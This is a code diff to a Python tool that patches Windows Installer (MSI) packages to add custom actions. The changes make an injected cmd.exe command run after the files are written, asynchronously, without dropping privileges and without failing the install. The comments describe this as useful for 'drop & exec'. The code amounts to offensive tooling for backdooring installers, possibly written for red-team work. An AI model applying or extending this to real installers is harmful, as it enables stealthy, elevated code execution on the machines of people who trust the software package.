@@ -22,6 +22,17 @@ ACTION_TYPE_JSCRIPT = 6
 ACTION_TYPE_CMD = 34
 ACTION_TYPE_SHELL = 50
 
+# https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options
+ACTION_TYPE_CONTINUE = 0x40         # Don't fail the installation if the command fails
+ACTION_TYPE_ASYNC = 0x80            # Don't wait for the command to complete - only relevant for EXE commands
+
+# https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options
+ACTION_TYPE_COMMIT = 0x200          # Only run once the files have been written to disk - useful for drop & exec
+ACTION_TYPE_IN_SCRIPT = 0x400       # Schedule this as part of the installation process
+ACTION_TYPE_NO_IMPERSONATE = 0x800  # Don't drop privs
+
+ACTION_SEQUENCE_POSITION = 4999     # Fire the command after the files are written to disk by the installation process
+
 def random_name(length=12):
     return ''.join(random.choice(string.ascii_letters) for _ in range(length))
 
@@ -132,7 +143,7 @@ class MSIPatcherWindows(MSIPatcher):
         rec = msilib.CreateRecord(3)
         rec.SetString(1, name)          # Action
         rec.SetString(2, "")            # Condition (probably want to use "NOT Installed")
-        rec.SetInteger(3, 1)            # Sequence
+        rec.SetInteger(3, ACTION_SEQUENCE_POSITION)            # Sequence
         seq.Execute(rec)
         seq.Close()
         db.Commit()
@@ -343,14 +354,16 @@ class MSIPatcherLinux(MSIPatcher):
             # Add CustomAction
             custom_action_file = os.path.join(temp_dir, 'CustomAction.idt')
             with open(custom_action_file, 'a', newline='') as f:
-                writer = csv.writer(f, delimiter='\t')
+                # Configure the CSV writer not to wrap fields in quotes even if they contain special chars,
+                # and to only try to escape \t and ` (which shouldn't occur in most Windows commands)
+                writer = csv.writer(f, delimiter='\t', quoting=csv.QUOTE_NONE, quotechar='`')
                 writer.writerow([name, str(type), source_key, target])
 
             # Add to sequence
             sequence_file = os.path.join(temp_dir, f'{sequence}.idt')
             with open(sequence_file, 'a', newline='') as f:
                 writer = csv.writer(f, delimiter='\t')
-                writer.writerow([name, '', '1'])
+                writer.writerow([name, '', str(ACTION_SEQUENCE_POSITION)])
 
             # Add the property file to the MSI
             subprocess.run(['msibuild', msi_path, 
@@ -491,7 +504,8 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     sequence = "InstallExecuteSequence"
-    action_type = ACTION_TYPE_SHELL
+    action_type = (ACTION_TYPE_SHELL | ACTION_TYPE_CONTINUE | ACTION_TYPE_ASYNC | ACTION_TYPE_COMMIT |
+                   ACTION_TYPE_IN_SCRIPT | ACTION_TYPE_NO_IMPERSONATE)
     source = "C:\\windows\\system32\\cmd.exe"
 
     patcher = get_msi_patcher()
